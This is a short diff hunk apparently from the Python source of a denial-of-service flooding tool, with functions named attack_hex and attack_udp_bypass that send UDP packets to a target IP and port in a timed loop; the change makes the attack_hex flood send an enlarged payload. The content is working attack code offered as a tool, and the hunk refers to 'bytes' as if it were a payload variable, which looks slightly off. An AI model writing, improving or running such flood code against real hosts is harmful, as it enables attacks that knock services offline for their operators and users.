@@ -50,7 +50,7 @@ def attack_hex(ip, port, secs):
     payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
     hex = payload + bytes
     while time.time() < secs:
-        s.sendto(payload, (ip, port))
+        s.sendto(hex, (ip, port))
 
 
 def attack_udp_bypass(ip, port, secs):
